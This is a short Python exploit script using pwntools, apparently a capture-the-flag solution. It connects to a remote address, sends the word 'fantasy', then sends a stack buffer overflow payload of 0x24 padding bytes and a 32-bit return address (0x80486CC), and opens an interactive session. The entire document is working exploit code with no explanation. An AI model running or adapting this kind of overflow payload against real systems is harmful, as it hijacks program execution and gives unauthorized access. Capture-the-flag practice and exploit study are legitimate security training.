from pwn import *

p = remote("111.198.29.45" , 30909)

p.sendlineafter("> " , "fantasy")
payload = "a" * 0x24 + p32(0x80486CC)
p.sendlineafter("> " , payload)
p.interactive()